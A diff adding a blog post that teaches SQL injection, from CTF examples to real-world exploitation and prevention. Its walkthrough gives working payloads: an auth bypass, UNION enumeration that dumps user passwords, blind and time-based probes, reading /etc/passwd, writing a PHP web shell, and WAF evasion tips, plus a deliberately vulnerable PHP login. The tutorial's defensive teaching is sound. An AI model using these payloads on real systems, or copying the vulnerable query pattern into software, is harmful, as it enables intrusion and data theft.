@@ -1,0 +1,224 @@
+---
+title: "From CTF to Real World: SQL Injection Deep Dive"
+description: "Learn how SQL injection works, how to find and exploit it, and how to prevent it in modern applications."
+date: "2026-02-11"
+slug: "sql-injection-deep-dive"
+thumbnail: "/blog/thumbnails/sqli-thumbnail.png"
+tags: ["sql injection", "web security", "ctf", "real world", "pentesting"]
+lang: "en"
+published: true
+---
+
+If you have ever played a CTF, you have probably seen a challenge that gives you a login form and tells you to retrieve the flag. You type `' OR 1=1 --` and suddenly you are logged in as admin. Easy, right? But in real-world applications, SQL injection is rarely that straightforward. Production systems have layers of defense, character restrictions, and complex logic that turn a simple `' OR 1=1` into a carefully crafted blind attack.
+
+This article bridges the gap between CTF-style SQLi and the challenges you will face in bug bounties and penetration tests. We will look at how SQL injection actually happens, how to systematically exploit different variants, and – most importantly – how to build applications that are immune to it.
+
+## What Is SQL Injection?
+
+SQL injection (SQLi) is a code injection technique that exploits a vulnerability in the database layer of an application. When user input is incorrectly filtered or concatenated directly into SQL queries, an attacker can alter the intended query and execute arbitrary SQL commands.
+
+The impact can range from authentication bypass to complete server takeover.
+
+## How It Works: A Minimal Example
+
+Consider a simple login script in PHP:
+
+```php {1-3,7}
+<?php
+$username = $_POST['username'];
+$password = $_POST['password'];
+
+$conn = new mysqli("localhost", "user", "pass", "db");
+$sql = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
+$result = $conn->query($sql);
+
+if ($result->num_rows > 0) {
+    // login success
+}
+?>
+```
+
+If an attacker sends `admin' --` as the username and anything as the password, the query becomes:
+
+```sql
+SELECT * FROM users WHERE username = 'admin' -- ' AND password = '...'
+```
+
+Everything after `--` is commented out. The password check disappears, and the attacker logs in as `admin`.
+
+This is the “CTF classic”. But what if the application uses `addslashes()`, or a WAF, or the database user has no `FILE` privilege? Real‑world exploitation requires a deeper understanding.
+
+## Types of SQL Injection
+
+SQL injection is generally classified into three categories, each requiring a different exploitation approach.
+
+### In‑band (Union‑based / Error‑based)
+
+The attacker receives the result of the injected query directly in the application response. This is the easiest type to exploit.
+
+**Union‑based** – uses the `UNION` operator to append an extra `SELECT` and retrieve data.
+
+**Error‑based** – forces the database to produce an error message that contains the desired data (e.g., `CONVERT(int, @@version)`).
+
+### Inferential (Blind)
+
+No visible error or data is returned. The attacker infers information by observing differences in the application’s behavior.
+
+**Boolean‑based** – sends payloads that cause the query to return `true` or `false` and sees if the page content changes.
+
+**Time‑based** – uses commands like `SLEEP(5)` and measures the response time.
+
+### Out‑of‑band
+
+Data is exfiltrated through a different channel, e.g., DNS or HTTP requests to an attacker‑controlled server. Often used when the response channel is unavailable.
+
+## Step‑by‑Step Exploitation
+
+Let’s walk through a realistic scenario: a search page that displays products from a database. The URL is `https://example.com/products?category=Gifts`.
+
+### 1. Detect the Vulnerability
+
+Insert a single quote (`'`) into the parameter. If the server returns an error, or the page behaves strangely, SQLi is possible.
+
+### 2. Determine the Number of Columns (Union)
+
+Use `ORDER BY` or `UNION SELECT`:
+
+```sql
+' ORDER BY 1-- -
+' ORDER BY 2-- -
+...
+```
+
+When `ORDER BY 5` produces an error, you know there are 4 columns.
+
+Alternatively, use `UNION SELECT` with nulls:
+
+```sql
+' UNION SELECT NULL,NULL,NULL-- -
+```
+
+### 3. Find Output Columns
+
+Replace `NULL` with test values to see which columns are echoed back:
+
+```sql
+' UNION SELECT 'a',NULL,NULL-- -
+' UNION SELECT NULL,'a',NULL-- -
+...
+```
+
+### 4. Extract Database Information
+
+Once you have a column that prints data, start enumerating:
+
+**Version**  
+```sql
+' UNION SELECT @@version,NULL,NULL-- -
+```
+
+**Current database**  
+```sql
+' UNION SELECT database(),NULL,NULL-- -
+```
+
+**Tables** (MySQL)  
+```sql
+' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema=database()-- -
+```
+
+**Columns**  
+```sql
+' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'-- -
+```
+
+**Data**  
+```sql
+' UNION SELECT username,password,NULL FROM users-- -
+```
+
+### 5. Blind SQL Injection
+
+When nothing is printed, you must rely on true/false or time delays.
+
+**Boolean example** – test if the database name starts with ‘a’:
+
+```sql
+' AND SUBSTRING(database(),1,1)='a'-- -
+```
+
+If the page returns normally (true) you know the first character is ‘a’.
+
+**Time‑based example** (MySQL):
+
+```sql
+' AND IF(SUBSTRING(database(),1,1)='a', SLEEP(3), 0)-- -
+```
+
+By measuring the delay, you can brute‑force the data bit by bit.
+
+### 6. Advanced: Reading / Writing Files
+
+If the database user has `FILE` privilege and `secure_file_priv` is not set, you can read system files:
+
+```sql
+' UNION SELECT LOAD_FILE('/etc/passwd'),NULL,NULL-- -
+```
+
+Or write a web shell:
+
+```sql
+' UNION SELECT "<?php system($_GET['cmd']); ?>",NULL,NULL INTO OUTFILE "/var/www/html/shell.php"-- -
+```
+
+In production, such privileges are almost never granted, but they appear occasionally in CTFs and misconfigured servers.
+
+## From CTF to Real World
+
+In CTF challenges, the vulnerable parameter is usually obvious, the database user is `root`, and there is no WAF. Real applications are different:
+
+- **WAF / IDS** – block obvious keywords like `UNION`, `SELECT`, `SLEEP`. You must learn to obfuscate payloads (case changing, comments, alternative encodings).
+- **Input filtering** – some apps strip quotes, escape backslashes, or use HTML‑encoding before query construction.
+- **Parameterised queries are the norm** – many modern frameworks (ORM, prepared statements) eliminate SQLi by design. But second‑order injection still slips through.
+- **Stored procedures** – can also be vulnerable if dynamic SQL is used inside.
+
+The mindset you develop in CTFs – understanding how the query is built and finding a way to break out – is exactly what you need in the real world. You just need to adapt your techniques to the restrictions you face.
+
+## Prevention: How to Build Secure Applications
+
+### 1. Prepared Statements (Parameterised Queries)
+
+This is the **only** reliable defense. The query structure is fixed, and user input is passed as parameters, never concatenated.
+
+**PHP (PDO)**  
+```php
+$stmt = $pdo->prepare("SELECT * FROM users WHERE email = ?");
+$stmt->execute([$_POST['email']]);
+```
+
+**Python (sqlite3)**  
+```python
+cursor.execute("SELECT * FROM users WHERE email = ?", (email,))
+```
+
+### 2. Stored Procedures
+
+Pre‑defined procedures can also be parameterised. Avoid dynamic SQL inside the procedure.
+
+### 3. Allow‑list Input Validation
+
+If a parameter is expected to be an integer, cast it to integer. If it must be one of a few values, check against a whitelist.
+
+### 4. Escaping
+
+Functions like `mysqli_real_escape_string()` are **not** sufficient in all scenarios (e.g., when dealing with multi‑byte encodings). Use prepared statements instead.
+
+### 5. Least Privilege
+
+The database user used by the application should have only the necessary permissions (no `FILE`, no `DROP`, no `CREATE`).
+
+## Conclusion
+
+SQL injection remains one of the most critical web vulnerabilities, despite being known for over two decades. CTFs are a perfect sandbox to learn the mechanics, but the real test is applying that knowledge against hardened systems. Always assume that user input is malicious, and let the database engine handle the separation between code and data.
+
+Now go break some queries – ethically, of course.
